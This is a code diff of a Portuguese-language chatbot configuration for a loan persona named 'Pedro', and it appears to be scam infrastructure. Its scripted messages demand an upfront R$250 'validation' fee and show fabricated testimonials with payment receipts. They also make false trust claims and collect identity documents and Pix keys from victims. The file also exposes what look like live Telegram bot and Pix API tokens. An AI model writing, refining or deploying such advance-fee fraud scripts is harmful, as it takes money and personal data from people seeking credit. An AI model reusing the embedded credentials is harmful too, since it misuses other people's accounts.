@@ -1,19 +1,16 @@
-// +---------------------------------------------------------------+
-// |  CONFIGURAÇÃO DO CHATBOT - PEDRO DA SILVA LIMA                |
-// |  Empréstimo Seguro • 2026 • Total Transparência               |
-// +---------------------------------------------------------------+
 window.CONFIG = {
   botName: "Pedro",
   botPhoto: "imagens/perfil.jpg",
   telegramToken: "8314626965:AAE6tBJyGopYJTD46nR-6EhwunV849pVrX4",
   telegramChatId: "8436758614",
   
-  // 🆕 CONFIGURAÇÃO PIX EVOPAY
+  // 🆕 CONFIGURAÇÃO PIX EVOPAY (Atualizada conforme docs)
   pix: {
     token: 'a09622ac-7a72-4a23-a6e9-caff88bf0465',
     valor: 250.00,
     pollingInterval: 5000,
-    callbackUrl: 'https://webhook.site/SEU-ID-UNICO' // ⚠️ Troque depois
+    callbackUrl: '',
+    apiURL: 'https://pix.evopay.cash/v1'
   },
   
   mensagens: {
@@ -39,7 +36,7 @@ Sou o Pedro e acompanharei todo o seu processo do início ao fim.<br><br>
 ✅ Este é meu único canal oficial de atendimento.<br>
 ✅ Não trabalho com representantes ou terceiros.<br>
 🚫 Desconfie de qualquer outro contato solicitando pagamentos em meu nome.<br><br>
-📋 <b>COMO FUNCIONA O PROCESSO</b><br>
+ <b>COMO FUNCIONA O PROCESSO</b><br>
 ✔️ Taxa única de <b>R$ 250,00</b> para validação contratual.<br>
 ✔️ Liberação entre <b>15 minutos e 24 horas</b> após confirmação.<br>
 ✔️ Contrato digital com comprovantes enviados ao cliente.<br>
@@ -62,7 +59,7 @@ Responda com:<br>
 ou <b>não tenho interesse</b>.`;
     },
     provaSocial() {
-      return `👀 <b>VEJA QUEM JÁ FOI LIBERADO HOJE:</b><br><br>
+      return ` <b>VEJA QUEM JÁ FOI LIBERADO HOJE:</b><br><br>
 <b>1. João (Urgente):</b> Liberado R$ 5.000 em 20min!<br>
 <img src="imagens/comprovantes/joao.jpg" style="width:100%; border-radius:12px; margin:10px 0; border:1px solid #ddd;"><br>
 <b>2. Maria (Medo de Golpe):</b> Recebeu R$ 3.000 em menos de 30min!<br>
@@ -82,7 +79,7 @@ Para prosseguir com a análise, envie os seguintes documentos:<br><br>
 💳 Chave Pix para recebimento<br><br>
 Além disso, informe:<br><br>
 💰 Valor desejado<br>
-💳 Forma de pagamento da taxa: <b>Pix ou Boleto</b><br>
+ Forma de pagamento da taxa: <b>Pix ou Boleto</b><br>
 📅 Data de vencimento desejada: <b>10, 20 ou 30</b><br><br>
 📎 Utilize o botão de anexo para enviar os documentos.<br><br>
 Após concluir, digite:<br>
